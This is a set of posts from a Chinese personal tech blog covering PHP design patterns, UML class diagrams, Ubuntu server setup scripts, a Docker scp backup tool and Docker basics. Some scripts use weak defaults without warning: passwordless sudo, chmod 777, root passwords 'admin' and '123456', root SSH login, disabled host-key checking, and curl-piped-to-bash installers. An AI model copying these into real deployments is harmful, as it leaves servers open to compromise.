    protected $observers = [];

    public function attach($observer)	# 绑定观察者
    {
        array_push($this->observers, $observer);
    }

    public function detach($observer)	# 解绑观察者
    {
        $index = array_search($observer, $this->observers);
        if ($index === false) return false;
        unset($this->observers[$index]);
        return true;
    }

    public function notify()	# 通知变更
    {
        if (!is_array($this->observers)) return false;
        foreach ($this->observers as $observer) {
            call_user_func([$observer,'update']);
        }
        return true;
    }
}

interface Observer	# 抽象观察者接口
{
    public function update();
}

class ConcreteObserver implements Observer	# 具体观察者
{
    protected $name;
    public function __construct($name)
    {
        $this->name = $name;
    }

    public function update()	# 收到状态变更信息后执行动作
    {
        echo "监听者 {$this->name} 收到变更消息";
    }
}
// 客户端使用
$subject = new ConcreteSubject();
$subject->attach(new ConcreteObserver('一号'));
$subject->attach(new ConcreteObserver('二号'));
$subject->attach(new ConcreteObserver('三号'));
$subject->notify();
```

#### 命令模式

> 对命令的封装, 将发出命令的职责和执行命令的职责分割开, 委派给不同的对象

模式所需角色:

- 命令角色(Command) : 声明了一个给所有具体命令的抽象接口,需要实现接口方法execute()
- 具体命令(ConcreteCommand) : 定义接受者和行为之间的弱耦合, 实现执行方法execute()
- 请求者(Invoker) : 负责调用命令对象执行请求, 需要传入命令对象
- 接收者(Receiver) : 负责具体实施和执行请求, 实现action()方法

![image-20211109223010611](/images/imgs/image-20211109223010611.png)



```php
<?php

interface Command       # 命令角色
{
    public function execute();
}

class CopyCommand implements Command        # 具体命令,需要指定接收者
{
    private $receiver;

    public function __construct(Receiver $receiver)
    {
        $this->receiver = $receiver;
    }

    public function execute()
    {
        $this->receiver->action();
    }
}

class PasteCommand implements Command       # 具体命令
{
    private $receiver;

    public function __construct(Receiver $receiver)
    {
        $this->receiver = $receiver;
    }

    public function execute()
    {
        $this->receiver->action();
    }
}

interface Receiver      # 接收者
{
    public function action();
}

class CopyReceiver implements Receiver  # 具体接收者
{
    private $name;
    public function __construct($name)
    {
        $this->name = $name;
    }

    public function action()    # 接收者执行命令
    {
        echo "{$this->name} 执行 COPY 操作";
    }
}

class PasteReceiver implements Receiver  # 具体接收者
{
    private $name;
    public function __construct($name)
    {
        $this->name = $name;
    }

    public function action()    # 接收者执行命令
    {
        echo "{$this->name} 执行 PASTE 操作";
    }
}

class Invoker   # 请求者
{
    private $command;
    public function __construct(Command $command)
    {
        $this->command = $command;
    }

    public function handle()    # 调用命令
    {
        $this->command->execute();
    }
}

# 客户端使用
// 单命令执行
$copyCommand = new CopyCommand(new CopyReceiver('张三'));
$pasteCommand = new PasteCommand(new PasteReceiver('张三'));
$invoker = new Invoker($copyCommand);
$invoker->handle();
```

#### 迭代器模式

> 封装遍历数据集合模式, 提供访问容器对象内各个元素, 但又不暴露该对象的内部细节

需要角色:

- 迭代器(Iterator) : 迭代器定义访问和遍历元素的接口
- 具体迭代器(ConcreteIterator) : 实现迭代器接口, 对该聚合遍历时追送当前位置
- 聚合对象接口(Aggregate) : 聚合定义相应迭代器对象的接口
- 具体聚合(ConcreteAggregate) : 具体聚合实现创建相应迭代器的接口, 返回迭代器实例

```php
<?php

class ArrIterator implements Iterator	# 实现PHP迭代器接口
{
    private $data;

    private $index;

    public function __construct($data)
    {
        $this->data = $data;
        $this->index = 0;
    }

    public function current()
    {
        return $this->data[$this->index];
    }

    public function next()
    {
        $this->index ++;
    }

    public function key()
    {
        return $this->index;
    }

    public function valid()
    {
        return $this->index < count($this->data);
    }

    public function rewind()
    {
        $this->index = 0;
    }
}

// 客户端使用
$arr = ['one','two','three','four'];
$iterator = new ArrIterator($arr);
foreach ($iterator as $item) {
    echo $item;
}
```

]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>后端</tag>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>UML类图详解</title>
    <url>/2020/02/17/UML%E7%B1%BB%E5%9B%BE%E7%BB%98%E5%88%B6/</url>
    <content><![CDATA[


## UML类图

### 类图的基本元素

![image-20211110002022081](/images/imgs/image-20211110002022081.png)

如上为一个普通的类

可以看到, 一个类由三部分组成, 顶部的类名, 中部的属性, 以及最下方的方法

- 类名部分一般用正常粗体标识, 若为抽象类则使用斜体字粗体, 若为接口则需要在上方加上 `<<interface>>` 标识

  ![image-20211110003201542](/images/imgs/image-20211110003201542.png)

- 属性部分一个属性一行, 组成格式为: `可见性 属性名: 属性数据类型`

- 方法部分一个方法一行, 组成格式为: 

  `可见性 方法名([[类型] 参数,[类型] 参数]) [:返回值]`

可见性包含以下几种

```
-   代表私有属性 private
#   代表保护属性 protected
+   代表公有属性 public
```

### 类之间的关系

类关系主要有六种: 继承、实现、组合、聚合、关联和依赖, 由类之间的箭头线标识

![image-20211110003358920](/images/imgs/image-20211110003358920.png)

#### 继承(extends)和实现(implements)

如下所示

![image-20211110003736823](/images/imgs/image-20211110003736823.png)

#### 组合(composition)与聚合(aggregation)

> 组合关系表示部分与整体的强绑定关系, 若主体消失, 部分也随之失效,用实心菱形表示
>
> 聚合关系中部分可以脱离整体独立存在, 用空心菱形表示

![image-20211110004959767](/images/imgs/image-20211110004959767.png)

#### 关联关系(Association)

> 表示一类对象与另一类对象之间有联系, 如汽车与轮胎, 班级和学生, 节点与节点等
>
> 关联关系也细分为四种: 双向关联、单向关联、自关联
>
> 单向关联使用带箭头的实线表示
>
> 双向关联使用不带箭头的实线表示

![image-20211110010456667](/images/imgs/image-20211110010456667.png)

#### 依赖关系(Dependency)

> 即一个事物的使用需要依赖另一个事物, 如下方Driver类中drive()方法的实现, 需要Car对象传入作为依赖, 调用Car类中的move()方法

![image-20211110011234234](/images/imgs/image-20211110011234234.png)

### 总结

> 六种类关系中, 从强到弱依次为: 继承→实现→组合→聚合→关联→依赖

![image-20211110012924660](/images/imgs/image-20211110012924660.png)]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>后端</tag>
        <tag>UML类图</tag>
      </tags>
  </entry>
  <entry>
    <title>从零配置一台服务器</title>
    <url>/2021/03/22/%E7%A9%BA%E7%99%BD%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[


# 从零配置一台服务器

> ubuntu server 18.04

## 基础服务器镜像安装

1.下载镜像

```
https://cn.ubuntu.com/download
```

2.使用创建VM虚拟机

> 在选择安装源的镜像地址时, 记得修改为国内源, 否则可能卡住
>
> ```
> http://mirrors.163.com/ubuntu
> http://mirrors.aliyun.com/ubuntu
> ```

3.测试登录

![image-20211110165537094](/images/imgs/image-20211110165537094.png)

4.使用XShell连接服务器

![image-20211110165842607](/images/imgs/image-20211110165842607.png)

5.修改root用户密码

```
sudo passwd root
```

```
ni9ne@ni9nes:$ sudo passwd root
[sudo] password for ni9ne: 
Enter new UNIX password: 
Retype new UNIX password: 
passwd: password updated successfully
```

## PHP环境搭建

1.复制环境搭建脚本

![image-20211110171403549](/images/imgs/image-20211110171403549.png)

2.脚本赋权

```shell
ni9ne@ni9nes:~$ sudo chmod -R 777 ./*
```

3.脚本文本格式转换

```shell
ni9ne@ni9nes:~$ apt-get install dos2unix
ni9ne@ni9nes:~$ sudo dos2unix ./*
dos2unix: converting file ./php_env_install.sh to Unix format...
dos2unix: converting file ./sudo_no_pass.sh to Unix format...
dos2unix: converting file ./vim_setnum.sh to Unix format...
```

4.执行脚本

- sudo命令无需输入密码

  ```shell
  ni9ne@ni9nes:~$ ./sudo_no_pass.sh 
  success get current user: ni9ne
  successd prepare permit_text: ni9ne ALL=(ALL:ALL) NOPASSWD: ALL
  ni9ne ALL=(ALL:ALL) NOPASSWD: ALL
  ni9ne ALL=(ALL:ALL) NOPASSWD: ALL
  check permit has not been done, do it
  successd chmod write permit to /etc/sudoers
  successd add permit_text [ ni9ne ALL=(ALL:ALL) NOPASSWD: ALL ] to /etc/sudoers
  successd reback permission /etc/sudoers to 440
  ```

- vim默认开启行号

  ```shell
  ni9ne@ni9nes:~$ ./vim_setnum.sh 
  vim 配置路径: /etc/vim/vimrc
  添加vim 默认行号开启
  ```

- php环境安装

  ```shell
  ni9ne@ni9nes:~$ ./php_env_install.sh
  ```

## shell脚本文件

### sudo_no_interupt.sh

```shell
#! /bin/bash
##
# Author: NI9NE
# Date: 2020/10/19
# Time: 11:32
# Description: 用于修复集团服务器sudo命令延迟并报错的问题
# Email: <ni9ne@outlook.com>
#/

current_hostname=`hostname`
echo "当前计算机名称为: ${current_hostname}"
current_hosts_contain=`sudo cat /etc/hosts`
current_word="127.0.0.1 ${current_hostname}"
echo "清空原有hosts数据"
sudo sh -c "echo '${current_word}' > /etc/hosts"
echo "添加当前计算机名称Hosts数据"
sudo sh -c "echo '${current_hosts_contain}' >> /etc/hosts"
```

### vim_setnum.sh

```shell
#! /bin/bash
##
# Author: NI9NE
# Date: 2020/10/19
# Time: 11:32
# Description: 用于将vim行号默认打开
# Email: <ni9ne@outlook.com>
#/

vimPath=`sudo find /etc/ -name vimrc`
echo "vim 配置路径: ${vimPath}"
sudo sh -c "echo 'set nu' >> ${vimPath}"
echo "添加vim 默认行号开启"
```

### php_env_install.sh

```shell
#! /bin/bash

##
# Author: NI9NE
# Time: 12:25
# Date: 2020/10/19
# Description: 用于安装PHP项目环境包括以下内容: tree/Git/Nginx/PHP/PHP扩展/MySql/Composer/libreoffice扩展
#              额外操作包括: Nginx项目目录www所属用户切换,当前用户添加到www组
#                          php-apcu扩展安装并打开
# Email: <ni9ne@outlook.com>
#/

echo '更新软件包源 : [ sudo apt-get update ]'
sudo apt-get update
echo '安装语言包'
sudo apt-get install -y language-pack-en-base
sudo locale-gen en_US.UTF-8
echo '安装tree'
sudo apt-get install -y tree
echo '安装nginx'
sudo apt-get install -y nginx
echo 'www文件夹权限添加'
sudo chmod g+w /var/www
echo 'www文件夹所属人变更为www-data'
sudo chown -R www-data:www-data /var/www
echo '当前用户添加到www-data组'
sudo usermod -g www-data `whoami`
echo '安装git'
sudo apt-get install -y git
echo '安装PHP'
sudo apt-get install -y php
sudo apt-get install -y php7.0-fpm
echo '安装PHP扩展:php7.0-mysql'
sudo apt-get install -y php7.0-mysql
echo '安装PHP扩展:php7.0-gd'
sudo apt-get install -y php7.0-gd
echo '安装PHP扩展:php7.0-soap'
sudo apt-get install php7.0-soap
echo '安装PHP扩展:php7.0-fileinfo'
sudo apt-get install -y php7.0-fileinfo
echo '安装PHP扩展:php7.0-mbstring'
sudo apt-get install -y php7.0-mbstring
echo '安装PHP扩展:php7.0-curl'
sudo apt-get install -y php7.0-curl
echo '安装PHP扩展:php7.0-zip'
sudo apt-get install -y php7.0-zip
echo '安装PHP扩展:php7.0-dom'
sudo apt-get install -y php7.0-dom
echo '安装PHP扩展:php7.0-odbc'
sudo apt-get install -y php7.0-odbc
echo '安装PHP扩展:php7.0-memcached'
sudo apt-get install -y php7.0-memcached
echo '安装PHP扩展:php7.0-memcache'
sudo apt-get install -y php7.0-memcache
echo '安装PHP扩展:php7.0-server'
sudo apt-get install -y mysql-server
echo '安装PHP扩展:php7.0-apcu'
sudo apt-get install php7.0-apcu
echo '安装PHP扩展:php7.0-apcu-bc'
sudo apt-get install php7.0-apcu-bc
echo '配置php-apcu 开启'
sudo sh -c "echo 'apc.enable_cli=On' >> '/etc/php/7.0/mods-available/apcu.ini'"
echo '重启php7.0'
sudo service php7.0-fpm restart
echo '添加仓库源'
sudo apt install software-properties-common
sudo add-apt-repository ppa:ondrej/php
echo '更新源'
sudo apt-get update
echo '升级 PHP'
sudo apt-get upgrade php
echo '更新驱动'
sudo apt-get install -y  php7.3-fpm
echo '切换 PHP 版本'
echo 1 | sudo update-alternatives --config php

echo '安裝libreoffice 扩展 :libreoffice-writer'
sudo apt-get install -y libreoffice-writer
echo '安裝libreoffice 扩展 :libreoffice-calc'
sudo apt-get install -y libreoffice-calc
echo '安裝libreoffice 扩展 :libreoffice-headless'
sudo apt-get install -y libreoffice-headless
echo '安裝composer'
php -r "copy('https://install.phpcomposer.com/installer', 'composer-setup.php');"
php composer-setup.php
php -r "unlink('composer-setup.php');"
echo '全局安装（环境变量）'
sudo mv composer.phar /usr/local/bin/composer
echo '更换composer阿里镜像'
composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/
echo 'composer降低版本为1.0'
sudo composer self-update --1

# echo '生成git秘钥'
# ssh-keygen -t rsa -C "ni9ne@outlook.com"
# 
# echo '安装docker'
# curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun
# echo '添加用户到docker组'
# sudo usermod -aG docker `whoami`
```

]]></content>
      <categories>
        <category>实际演练</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>shell</tag>
        <tag>服务器</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker_文件数据备份实战</title>
    <url>/2021/07/15/Docker_%E6%96%87%E4%BB%B6%E6%95%B0%E6%8D%AE%E5%A4%87%E4%BB%BD%E5%AE%9E%E6%88%98/</url>
    <content><![CDATA[
## Docker文件数据备份

该脚本运行需要要求环境有 `scp` 应用, 配置好远端及本地备份路径后, 直接运行即可, 

### 配置文件目录:

 `config.sh`

### 功能:

```
拉取远端服务器文件到本脚本所在目录:File_Bak
```

### 常用命令

```bash
docker build --no-cache -t file_back_up .
docker run --name c_file_back_up -v [主机备份目录]:/File/[配置容器备份目录] -d file_back_up
```

### 容器自启动

```bash
docker update --restart=always c_file_back_up
```

### 查看crond日志详情

```
cat /var/log/crond.log
```

### 自定义逻辑

```
1.备份日志为/File/log.txt
2.crond定时任务日志在/var/log/crond.log
3.最新一次拉取日志debug信息在/File/currentlog.txt
4.备份文件在/File/File_Bak, 可以通过修改config.sh中[local_path]更改
5.ssh证书密钥请放在env文件中, 并修改config.sh读取路径
6.当前设置为每5分钟定时拉取一次, 失败尝试三次, 三次后放弃, 需要请修改时长
```

### Dockerfile文件

```dockerfile
FROM alpine:3.12.1

WORKDIR File

COPY . .

RUN sed -i 's/dl-cdn.alpinelinux.org/mirrors.aliyun.com/g' /etc/apk/repositories; \
    apk add --no-cache openssh tzdata; \
    cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime; \
    apk del tzdata; \
    apk add --no-cache dos2unix curl; \
    dos2unix *.sh; \
    dos2unix config; \
    apk del dos2unix; \
    chmod 600 ./env/id_rsa_190; \
    sed -i "s/#PermitRootLogin.*/PermitRootLogin yes/g" /etc/ssh/sshd_config; \
    ssh-keygen -t dsa -P "" -f /etc/ssh/ssh_host_dsa_key; \
    ssh-keygen -t rsa -P "" -f /etc/ssh/ssh_host_rsa_key; \
    ssh-keygen -t ecdsa -P "" -f /etc/ssh/ssh_host_ecdsa_key; \
    ssh-keygen -t ed25519 -P "" -f /etc/ssh/ssh_host_ed25519_key; \
    echo "root:admin" | chpasswd; \
    echo "*/2 * * * * cd /File && /bin/sh ./scp_back_up.sh > currentlog.txt" >> /var/spool/cron/crontabs/root;

EXPOSE 22

CMD crond -L /var/log/crond.log -f
```

### scp_back_up.sh脚本

```shell
#! /bin/sh

######################### ↓↓↓ 方法区域  ↓↓↓ ############################
sendMsg(){
    if [ ${production} -eq 'true' ]; then
        MessageUrl=${alert_notice_product}
    else
        MessageUrl=${alert_notice_debug}
    fi
    PostData="{\"msgtype\":\"markdown\",\"markdown\":{\"content\":\"### 项目: 文件备份\n >${IP}${NAME}\n${1}\n${2}\"}}"
    echo -e "\n ${current_time}" >> ${notice_file}
    echo "curl -H \"Content-Type: application/json;charset=utf-8\" -X POST -d \"${PostData}\" \"${MessageUrl}\"" >> ${notice_file}
    curl -H "Content-Type: application/json;charset=utf-8" -X POST -d "${PostData}" "${MessageUrl}" >> ${notice_file}
}

# 获取远端文件夹内创建时间在规定期间的文件
getFile(){
    echo "ssh -i ${identify_file} -o StrictHostKeyChecking=no -p ${PORT} ${USER}@${IP} \"find ${back_up_file_path} -type f -ctime ${back_time}\""
    ssh -i ${identify_file} -o StrictHostKeyChecking=no -p ${PORT} ${USER}@${IP} "find ${back_up_file_path} -type f -ctime ${back_time}" > ${current_time}.txt
}


######################### ↑↑↑ 方法区域  ↑↑↑ ############################

# 引入配置文件
source config
# 当前时间
current_time=`date "+%Y-%m-%d_%H:%M:%S"`

# 创建文件夹
if [[ ! -d ${local_tmp_path} ]]; then
        mkdir -p ${local_tmp_path}
fi

if [[ ! -d ${local_path} ]]; then
        mkdir -p ${local_path}
fi
if [[ ! -f ${log_file} ]]; then
        touch ${log_file}
fi
if [[ ! -f ${notice_file} ]]; then
        touch ${notice_file}
fi
if [[ ! -f ${current_time}.txt ]]; then
        touch ${current_time}.txt
fi
if [[ ! -f ${current_time}false.txt ]]; then
        touch ${current_time}false.txt
fi

getFile

if [ ! -s ${current_time}.txt ]; then
  rm -f ${current_time}.txt
  rm -f ${current_time}false.txt
  sendMsg "${IP}:${file_path}" "${current_time}备份文件为空,备份失败"
  exit 0
fi

cat ${current_time}.txt | while read LINE ; do
    file_path=${LINE}
    file_name=`basename ${LINE}`
    # 普通ssh登录
    # scp -r -v -p -P ${PORT} -l ${transfer_speed} ${USER}@${IP}:${back_up_file_path}${back_up_file_name} ${local_path}

    # 使用密钥文件登录
    count_times=0

    # 尝试最多三次拉取远端文件
    while [[ ${count_times} -lt 3 ]]; do
        count_times=`expr ${count_times} + 1`
        # echo "scp -r -v -p -i ${identify_file} -P ${PORT} -l ${transfer_speed} ${USER}@${IP}:${back_up_file_path}${back_up_file_name} ${local_tmp_path}"
        echo "scp -r -v -p -i ${identify_file} -o StrictHostKeyChecking=no -P ${PORT} -l ${transfer_speed} ${USER}@${IP}:${file_path} ${local_tmp_path}"
        scp -r -v -p -i ${identify_file} -o StrictHostKeyChecking=no -P ${PORT} -l ${transfer_speed} ${USER}@${IP}:${file_path} ${local_tmp_path}
        cmd_result=$?
        # 拉取成功后跳出
        if [[ ${cmd_result} -eq 0 ]]; then
                sh -c "echo '${current_time}第${count_times}次拉取数据${file_path}成功' >>  ${log_file}"
                break
        fi
        sleep 5
    done

    # 判读是否成功移动,写入日志
    if [[ ${cmd_result} -eq 0 ]]; then
        echo "${current_time}移动文件到缓存目录 ${local_tmp_path} 成功"
        sh -c "echo '${current_time}移动文件到缓存目录 ${local_tmp_path} 成功'  >> ${log_file}"
    else
        echo "${cmd_result}" > ${current_time}false.txt
        echo "!!! ${current_time}拉取远端文件到缓存目录 ${local_tmp_path} 失败"
        sh -c "echo '!!! ${current_time}拉取远端文件到缓存目录 ${local_tmp_path} 失败'  >> ${log_file}"
        # 调用通知函数发送失败通知
        sendMsg "${IP}${file_path}" "!!!${current_time}拉取远端文件到缓存目录${local_tmp_path}失败"
    fi

    # 从缓存目录移动文件到实际备份文件夹
    mv ${local_tmp_path}/${file_name} ${local_path}
    mv_result=$?
    if [[ ${mv_result} -ne 0 ]]; then
        echo "${mv_result}" > ${current_time}false.txt
        echo "!!! ${current_time}移动文件${local_tmp_path}${file_name} 到目录 ${local_path} 失败"
        sh -c "echo '!!! ${current_time}移动文件${local_tmp_path}${file_name} 到目录 ${local_path} 失败' >> ${log_file}"
        sendMsg "${IP}${file_name}" "!!!${current_time}移动文件${local_tmp_path}${file_name}到目录${local_path}失败"
    else
        echo "!!! ${current_time}移动文件${local_tmp_path}${file_name} 到目录 ${local_path} 成功"
    fi
    echo 'end'
done
# 删除文件清单
rm -r ${current_time}.txt

if [ ! -s ${current_time}false.txt ]; then
  sendMsg "${IP}:${file_path}" "${current_time}备份文件成功"
else
  sendMsg "${IP}:${file_path}" "!!!${current_time}备份文件有错误,请查看日志详情"
fi
rm -r ${current_time}false.txt
```

### config配置文件

```
# 远端配置
NAME='日常备份'              # 项目名称
USER='[使用用户]'                    # 用户名
IP='xxx.xxx.xxx.xxx'              # IP地址
PORT='[端口]'                    # 端口

# 功能配置
identify_file='./env/[公钥文件名]'                # 登录公钥文件
transfer_speed='200000'                           # 最大传输速度 kb/s

# 项目文件配置
back_up_file_path='/var/www/[备份文件夹名]/'                # 远端备份路径
local_tmp_path='/var/www/LocalCFS/temp'                      # 本地缓存路径
local_path='/File/File_Bak/[项目名]/'  	        # 本地存储路径
back_time='-1'                                  # 遵循find命令格式,-1代表一天之内的文件

# 日志文件/通知配置
alert_notice_product='https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=xxxxxx'
alert_notice_debug='https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=xxxxxx'
log_file='log.txt'                              # 日志名称
notice_file='notice.txt'                        # 消息日志名称
production=false                                # 消息发送环境设定
```



]]></content>
      <categories>
        <category>实际演练</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>后端</tag>
        <tag>Docker</tag>
        <tag>Shell</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker手动安装</title>
    <url>/2021/03/15/Docker%E6%89%8B%E5%8A%A8%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[
## Docker手动安装

安装环境: ubuntu

官方脚本

```
curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun
```

```
curl -sSL https://get.daocloud.io/docker | sh
```

手动安装

- 卸载

  ```
  $ sudo apt-get remove docker docker-engine docker.io containerd runc
  ```

- 设置仓库

  ```ssh
  # 更新包
  $ sudo apt-get update
  # 安装依赖(用以通过https获取仓库)
  $ sudo apt-get install apt-transport-https ca-certificates curl gnupg-agent software-properties-common
  # 添加官方GPG秘钥
  $ curl -fsSL https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/gpg | sudo apt-key add -
  # 检索是否拥有指纹信息
  $ sudo apt-key fingerprint 0EBFCD88
  # 设置稳定版仓库
  $ sudo add-apt-repository "deb [arch=amd64] https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/ $(lsb_release -cs) stable"
  ```

- 安装(Docker Engine-Community)

  ```ssh
  # 更新包
  $ sudo apt-get update
  # 安装最新版
  $ sudo apt-get install docker-ce docker-ce-cli containerd.io
  # 安装指定版本
  ## 列出您的仓库中可用的版本
  $ apt-cache madison docker-ce
   显示内容:
    docker-ce | 5:18.09.1~3-0~ubuntu-xenial | https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu  xenial/stable amd64 Packages
    docker-ce | 5:18.09.0~3-0~ubuntu-xenial | https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu  xenial/stable amd64 Packages
  ## 安装指定版本
  $ sudo apt-get install docker-ce=<VERSION_STRING> docker-ce-cli=<VERSION_STRING> containerd.io
  # 测试安装状态
  $ sudo docker run hello-world
  ```

- 当前用户添加组

  ```
  $ sudo usermod -aG docker your-user
  ```

  > 添加完成后当前用户断开ssh连接, 重新登录即可使用groups查看是否添加成功

]]></content>
      <categories>
        <category>环境配置</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>后端</tag>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker使用</title>
    <url>/2021/05/07/Docker%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[
## 基本操作

### 1.使用镜像执行动作

```ssh
$ docker run ubuntu:15.10 /bin/echo 'hello docer'
```

```
结果:
Unable to find image 'ubuntu:15.10' locally
15.10: Pulling from library/ubuntu
7dcf5a444392: Pull complete 
759aa75f3cee: Pull complete 
3fa871dc8a2b: Pull complete 
224c42ae46e7: Pull complete 
Digest: sha256:02521a2d079595241c6793b2044f02eecf294034f31d6e235ac4b2b54ffc41f3
Status: Downloaded newer image for ubuntu:15.10
hello world
```

### 2.交互式运行

```ssh
$ docker run -i -t ubuntu:15.10 /bin/bash
$ docker run --interactive --tty ubuntu /bin/bash   #(不指定版本,默认latest)
```

### 3.守护进程运行

```ssh
$ docker run -d ubuntu:15.10 /bin/sh -c "while true; do echo hello world; sleep 1; done"
```

```
结果
2e3b96095dd69911032f02d44cb483b1d5cc824f15a3296a9ddbd1070b054b9e
2e3b96095dd6
```

### 4.查看当前守护进程运行的docker

```ssh
$ docker ps
```

```
结果
CONTAINER ID | IMAGE        | COMMAND     | CREATED       |STATUS      |PORTS      |NAMES
9e3c78addf64 | ubuntu:15.10 | "/bin/bash" | 13 minutes ago|Up 13 minutes|    |loving_shaw
```

### 5.退出当前docker

```ssh
$ exit
```

### 6.查看指定容器执行日志

```ssh
$ docker logs 9e3c78addf64
```

### 7.停止容器运行

```ssh
$ docker stop [9e3c78addf64/loving_shaw]
```

### 8.操作已运行容器

```ssh
$ docker exec -it 8dfd51f8b37c /bin/bash
```

### 9.删除未使用中容器

```ssh
$ docker rm [容器ID]
```

## 镜像操作

### 1.列出本机镜像

```ssh
$ docker images
```

```
结果
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
hello-world         latest              bf756fb1ae65        9 months ago        13.3kB
ubuntu              15.10               9b9cb95443b5        4 years ago         137MB
```

### 2.查找镜像

```ssh
$ docker search httpd
```



| NAME                    | DESCRIPTION                                   | STARS | OFFICIAL | AUTOMATED |
| ----------------------- | --------------------------------------------- | ----- | -------- | --------- |
| httpd                   | The Apache HTTP Server Project                | 3219  | [OK]     |           |
| centos/httpd-24-centos7 | Platform for running Apache httpd 2.4 or bui… | 36    |          |           |
| centos/httpd            |                                               | 32    |          | [OK]      |

>  或者 [Docker Hub](https://hub.docker.com/) 

### 3.手动拉取镜像

```ssh
$ docker pull ubuntu:13.10
```

### 4.删除镜像

```ssh
$ docker rmi hello-world
```

```ssh
$ docker rmi --force hello-world:latest 
Untagged: hello-world:latest
Untagged: hello-world@sha256:8c5aeeb6a5f3ba4883347d3747a7249f491766ca1caa47e5da5dfcf6b9b717c0
Deleted: sha256:bf756fb1ae65adf866bd8c456593cd24beb6a0a061dedf42b26a993176745f6b
```

### 5.更新镜像

```ssh
$ docker commit -m='done some things' -a='ni9ne' cc7adb4b2145 ni9ne/ubuntu:V1
```

```
sha256:3de2fb0fa6533c64256e085959e358030544bbd819154a4ccb04ab902ffae6e0
$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
ni9ne/ubuntu        v1                  3de2fb0fa653        12 seconds ago      137MB
httpd               latest              3dd970e6b110        10 days ago         138MB
ubuntu              latest              9140108b62dc        3 weeks ago         72.9MB
ubuntu              15.10               9b9cb95443b5        4 years ago         137MB
ubuntu              13.10               7f020f7bf345        6 years ago         185MB
$ docker run -ti ni9ne/ubuntu
ni9ne/ubuntu     ni9ne/ubuntu:v1 
$ docker run -ti ni9ne/ubuntu:v1 /bin/bash
root@f8cab436a299:/#

```

### 6.创建镜像

```ssh
$ docker build -t ni9ne/centos6.7 docker/
```

> 指定以`docker`文件夹下的`Dockerfile`创建名为`ni9ne/centos6.7`的镜像

```
$ vi docker/Dockerfile
```

```vim
  1 FROM centos:6.7
  2 MAINTAINER Ni9ne "ni9ne@outlook.com" 
  3 
  4 RUN /bin/echo 'root:123456' | chpasswd
  5 RUN useradd ni9ne
  6 RUN /bin/echo 'ni9ne:ni9ne' | chpasswd
  7 RUN /bin/echo -e "LANG=\"en_US.UTF-8\"" > /etc/default/local
  8 EXPOSE 22
  9 EXPOSE 80
 10 CMD /usr/sbin/sshd -D
```

查看创建镜像

```
ubuntu@ubuntu:~$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
ni9ne/centos6.7     latest              95cc1d4ddbfe        11 minutes ago      191MB
 ...
```

### 7.为镜像添加tag

```ssh
$ docker tag 95cc1d4ddbfe ni9nee/centos6.7:dev
```

```
ubuntu@ubuntu:~$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
ni9nee/centos6.7    dev.1               95cc1d4ddbfe        13 minutes ago      191MB
ni9ne/centos6.7     latest              95cc1d4ddbfe        13 minutes ago      191MB
 ...
```

> 生成相同 `IMAGE ID` 的不同镜像

### 8.发布镜像到docker_hub

```ssh
$ docker login  / docker login -u [USER_NAME]         	# 登录docker_hub
$ docker tag [IMAGE_NAME] [USER_NAME]/[IMAGE_NAME]		# 给镜像打标签,重命名
$ docker push [USER_NAME]/[IMAGE_NAME]					# 推送
```



## 容器连接

### 1.端口开放

```ssh
$ docker run -d -P training/webapp python app.py
```

```
-d --detach 			守护进程运行并打印出容器id
-P --publish-all list 	将容器端口随机映射到主机高端口
-p --publish list 		将容器端口映射到指定主机端口
--name 					重命名为指定容器名
```

```ssh
$ docker run -d -p 127.0.0.1:5000:5000/udp training/webapp python app.py
```

### 2.查看容器端口开放状态

```ssh
$ docker port d1f753a28378
```

```
5000/tcp -> 0.0.0.0:32768
```

### 3.容器命名

除系统随机命名外, 还可用选项 `--name ` 指定该容器的名称

```ssh
$ docker run -d -P --name test_name ubuntu /bin/bash
```

```
e086aa4536def6b30efe6302e43d2dc457013cc3b4ddc32f0d8dc6b86e7af3dd
```

### 4.新建网络

```ssh
$ docker network create -d bridge test-net
```

```
c01cbf143f2ab43100d55b93910d0082980a99bbfb7a739f03fcd73625aec4f2
```

```
-d, --driver string        Driver to manage the Network (default "bridge")
						   指定 Docker 网络类型，有 bridge、overlay。
```

> docker network COMMAND

| 参数       | 功能                                                 |      |
| ---------- | ---------------------------------------------------- | ---- |
| connect    | Connect a container to a network                     |      |
| create     | Create a network                                     |      |
| disconnect | Disconnect a container from a network                |      |
| inspect    | Display detailed information on one or more networks |      |
| ls         | List networks                                        |      |
| prune      | Remove all unused networks                           |      |
| rm         | Remove one or more networks                          |      |

### 5.连接容器到网络

```ssh
$ docker run -itd --name test1 --network test-net ubuntu /bin/bash
```

```ssh
$ docker run -itd --name test2 --network test-net ubuntu /bin/bash
```

### 6.测试

```ssh
apt-get update
apt install iputils-ping
ping test1
```

### 7.配置DNS

#### 1.配置全局DNS

- 宿主机配置

```ssh
$ sudo vim etc/docker/daemon.json
```

```json
{
  "dns" : [
    "114.114.114.114",
    "8.8.8.8"
  ]
}
```

- 重启docker

```ssh
$ sudo service docker restart 
```

- 查看是否生效

```ssh
